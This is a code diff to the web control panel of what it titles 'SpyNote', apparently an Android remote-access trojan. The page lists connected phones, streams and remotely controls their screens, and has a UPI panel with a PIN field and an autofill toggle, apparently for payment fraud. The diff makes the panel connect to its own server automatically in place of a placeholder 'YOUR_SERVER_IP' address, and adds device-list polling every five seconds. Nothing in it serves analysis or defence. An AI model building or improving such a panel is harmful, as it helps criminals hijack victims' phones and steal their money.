@@ -3,7 +3,7 @@
 <head>
     <title>📱 SpyNote Control Panel v2.0</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <script src="http://YOUR_SERVER_IP:3000/socket.io/socket.io.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -105,7 +105,7 @@
 <body>
     <div id="devices">
         <h3>📱 Connected Devices</h3>
-        <div id="device-list">🔄 Connecting...</div>
+        <div id="device-list">🔄 Loading devices...</div>
     </div>
     
     <div id="upi-panel">
@@ -140,7 +140,8 @@
     </div>
 
     <script>
-        const socket = io('http://YOUR_SERVER_IP:3000'); // अपना IP यहाँ डालें
+        // 🔥 AUTO CONNECT TO CURRENT SERVER (NO IP CHANGE NEEDED)
+        const socket = io();
         let currentDevice = null;
         let deviceWidth = 1080, deviceHeight = 1920;
         let lastFrameTime = 0, frameCount = 0;
@@ -157,11 +158,22 @@
         const upiPinInput = document.getElementById('upiPin');
         const autofillToggle = document.getElementById('autofillToggle');
 
+        // 🔥 LOAD DEVICES ON START
+        function loadDevices() {
+            fetch('/devices')
+                .then(r => r.json())
+                .then(devices => updateDeviceList(devices))
+                .catch(() => {
+                    deviceList.innerHTML = '<div style="color:#ff6666; padding:20px; text-align:center;">❌ Server Error<br><small>Check console</small></div>';
+                });
+        }
+
         // Socket Events
         socket.on('connect', () => {
             connectionStatus.textContent = '✅ LIVE';
             connectionStatus.style.color = '#00ff88';
             console.log('✅ WebSocket Connected');
+            loadDevices(); // 🔥 LOAD ON CONNECT
         });
 
         socket.on('devices-update', (devices) => {
@@ -201,9 +213,6 @@
             }
         });
 
-        // Initial device fetch
-        fetch('http://YOUR_SERVER_IP:3000/devices').then(r => r.json()).then(updateDeviceList);
-
         function updateDeviceList(devices) {
             if (!devices || devices.length === 0) {
                 deviceList.innerHTML = '<div style="color:#ff6666; padding:20px; text-align:center;">📱 No devices online<br><small>Start app on phone</small></div>';
@@ -230,8 +239,10 @@
             document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
             element.classList.add('active');
             console.log('📱 Selected:', deviceId);
-            socket.emit('select-device', { deviceId });
         }
+
+        // 🔥 AUTO REFRESH EVERY 5 SECONDS
+        setInterval(loadDevices, 5000);
 
         // Touch/Mouse Controls
         let startX = 0, startY = 0;
@@ -319,6 +330,9 @@
             if (!currentDevice) return;
             socket.emit('restart-session', { deviceId: currentDevice });
         }
+
+        // 🔥 START LOADING
+        loadDevices();
     </script>
 </body>
 </html>
